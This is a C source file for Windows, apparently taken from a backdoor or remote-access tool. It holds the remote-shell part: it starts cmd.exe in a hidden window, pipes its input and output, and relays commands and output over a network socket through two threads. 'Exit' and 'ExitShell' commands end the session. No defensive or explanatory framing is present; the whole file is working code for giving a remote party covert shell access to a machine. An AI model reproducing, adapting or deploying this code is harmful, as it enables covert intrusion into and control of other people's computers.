struct SESSION_DATA 
{
    HANDLE  ClientReadPipeHandle;   
    HANDLE  ClientWritePipeHandle;  
    HANDLE  ShellProcessHandle; 

    SOCKET  ClientSocket;          
    HANDLE  ReadShellThreadHandle;  
    HANDLE  WriteShellThreadHandle; 
	BOOL    ReturnShell;
};

struct SESSION_DATA* CreateSession(void)
{
    struct SESSION_DATA* Session;
	HANDLE ShellReadPipeHandle  = NULL;
    HANDLE ShellWritePipeHandle = NULL;
    SECURITY_ATTRIBUTES  sa = {0} ;  
	STARTUPINFO          si = {0} ;
	PROCESS_INFORMATION  pi = {0} ; 
	char  CmdPath[MAX_PATH] = {0} ;

    Session=(struct SESSION_DATA*)malloc(sizeof(struct SESSION_DATA));
	if(Session == NULL)
		return NULL;
    Session->ClientReadPipeHandle  = NULL;
    Session->ClientWritePipeHandle = NULL;
	Session->ReturnShell           = false;

    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL; 
    sa.bInheritHandle = TRUE;

    if(!CreatePipe(&Session->ClientReadPipeHandle, &ShellWritePipeHandle,&sa, 0))
	{
		if(Session->ClientReadPipeHandle != NULL) CloseHandle(Session->ClientReadPipeHandle);
		if(ShellWritePipeHandle != NULL)		  CloseHandle(ShellWritePipeHandle);
		free(Session);
		return NULL;
    }

    if(!CreatePipe(&ShellReadPipeHandle, &Session->ClientWritePipeHandle,&sa, 0)) 
	{
		if(Session->ClientReadPipeHandle != NULL)  CloseHandle(Session->ClientReadPipeHandle);
		if(ShellWritePipeHandle != NULL)           CloseHandle(ShellWritePipeHandle);
		if(Session->ClientWritePipeHandle != NULL) CloseHandle(Session->ClientWritePipeHandle);
		if(ShellReadPipeHandle != NULL)            CloseHandle(ShellReadPipeHandle);
		free(Session);
		return NULL;
    }
   
	memset((void *)&si,0,sizeof(si));
    memset((void *)&pi,0,sizeof(pi));
	
	GetStartupInfo(&si);
	si.cb = sizeof(STARTUPINFO);
    si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput  = ShellReadPipeHandle;
    si.hStdOutput = si.hStdError = ShellWritePipeHandle;
	if(GetSystemDirectory(CmdPath,MAX_PATH))
	{
		strcat(CmdPath,"\\cmd.exe");
	}
	else
    {
      CloseHandle(Session->ClientReadPipeHandle);
	  CloseHandle(Session->ClientWritePipeHandle);
	  CloseHandle(ShellReadPipeHandle);
      CloseHandle(ShellWritePipeHandle);
	  free(Session);
	  return NULL;
    }//CmdPath
    if (!CreateProcess(NULL, CmdPath, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) 
	{
      CloseHandle(Session->ClientReadPipeHandle);
	  CloseHandle(Session->ClientWritePipeHandle);
	  CloseHandle(ShellReadPipeHandle);
      CloseHandle(ShellWritePipeHandle);
	  free(Session);
	  return NULL;
    }
	Session->ShellProcessHandle = pi.hProcess;
    
	CloseHandle(pi.hThread);
    CloseHandle(ShellReadPipeHandle);
    CloseHandle(ShellWritePipeHandle);
    
    return(Session);
}

void WINAPI SessionReadShellThread(LPVOID Parameter)
{
    struct   SESSION_DATA* Session;
	unsigned long        BytesRead;
    char   ReadShellBuff[MAX_BUFF];

    Session=(struct SESSION_DATA*)Parameter;
    
    while (PeekNamedPipe(Session->ClientReadPipeHandle, ReadShellBuff, sizeof(ReadShellBuff), &BytesRead, NULL, NULL))
	{
		memset(ReadShellBuff,0,MAX_BUFF);
        if (BytesRead > 0)
	    	ZXSAPI::ReadFile(Session->ClientReadPipeHandle, ReadShellBuff, sizeof(ReadShellBuff), &BytesRead, NULL);
        else
		{
  	    	Sleep(50);
	    	continue;
		}
		if(SendMessage(Session->ClientSocket,ReadShellBuff) == -1)
		   break;
	}
    if(GetLastError()!= ERROR_BROKEN_PIPE) {;}

    ExitThread(0);
}

void WINAPI SessionWriteShellThread(LPVOID Parameter)
{
    struct    SESSION_DATA* Session;
	unsigned long         ByteWrite;
	char   ShellWriteBuff[KEY_BUFF];

	Session=(struct SESSION_DATA*)Parameter;
	
	while(1)
	{   
		memset(ShellWriteBuff,0,KEY_BUFF);
		ByteWrite = ReveiceMessage(Session->ClientSocket,ShellWriteBuff,KEY_BUFF,60);
		if(!stricmp(ShellWriteBuff,"Exit"))
		{   
			Session->ReturnShell = false;
	    	ExitThread(0);
		}
		if(!stricmp(ShellWriteBuff,"ExitShell"))
		{
			Session->ReturnShell = true;
			SendMessage(Session->ClientSocket,"\r\n");
	    	ExitThread(0);
		}
		strcat(ShellWriteBuff,"\n");
		if (! WriteFile(Session->ClientWritePipeHandle,ShellWriteBuff, ByteWrite, &ByteWrite, NULL)) 
			break;
	}
    ExitThread(0);
}

DWORD CmdShell(SOCKET  Socket)
{
    SECURITY_ATTRIBUTES SecurityAttributes;
    DWORD  ThreadId;
    HANDLE HandleArray[3];
    int i;
    struct SESSION_DATA* Session;
    Session = (struct SESSION_DATA*)malloc(sizeof(struct SESSION_DATA));
    Session = CreateSession();
	if(Session == NULL)
		return 1;
    Session->ClientSocket = Socket;

    SecurityAttributes.nLength = sizeof(SecurityAttributes);
    SecurityAttributes.lpSecurityDescriptor = NULL; 
    SecurityAttributes.bInheritHandle = FALSE; 

    Session->ReadShellThreadHandle = CreateThread(&SecurityAttributes, 0, (LPTHREAD_START_ROUTINE) SessionReadShellThread, (LPVOID) Session, 0, &ThreadId);
    if (Session->ReadShellThreadHandle == NULL)	
	{
        Session->ClientSocket = INVALID_SOCKET;
        return 1;
    }
    
    Session->WriteShellThreadHandle = CreateThread(&SecurityAttributes, 0, (LPTHREAD_START_ROUTINE) SessionWriteShellThread, (LPVOID) Session, 0, &ThreadId);
    if (Session->WriteShellThreadHandle == NULL) 
	{
		Session->ClientSocket = INVALID_SOCKET;
        TerminateThread(Session->WriteShellThreadHandle, 0);
        return 1;
    }

    HandleArray[0] = Session->ReadShellThreadHandle;
    HandleArray[1] = Session->WriteShellThreadHandle;
    HandleArray[2] = Session->ShellProcessHandle;

    i = WaitForMultipleObjects(3, HandleArray, FALSE, 0xffffffff);
    switch (i) 
	{
        case WAIT_OBJECT_0 + 0:
             TerminateThread(Session->WriteShellThreadHandle, 0);
             ZXSAPI::TerminateProcess(Session->ShellProcessHandle, 1);
             break;
        case WAIT_OBJECT_0 + 1:
             TerminateThread(Session->ReadShellThreadHandle, 0);
             ZXSAPI::TerminateProcess(Session->ShellProcessHandle, 1);
             break;
        case WAIT_OBJECT_0 + 2:
             TerminateThread(Session->WriteShellThreadHandle, 0);
             TerminateThread(Session->ReadShellThreadHandle, 0);
             break;
	    default:
             break;
    }
    
    DisconnectNamedPipe(Session->ClientReadPipeHandle);
    CloseHandle(Session->ClientReadPipeHandle);
    DisconnectNamedPipe(Session->ClientWritePipeHandle);
    CloseHandle(Session->ClientWritePipeHandle);
    CloseHandle(Session->ReadShellThreadHandle);
    CloseHandle(Session->WriteShellThreadHandle);
    CloseHandle(Session->ShellProcessHandle);
	if(!Session->ReturnShell)  CloseSocket(Session->ClientSocket);
    if(Session != NULL)	       free(Session);

    return 0;
}

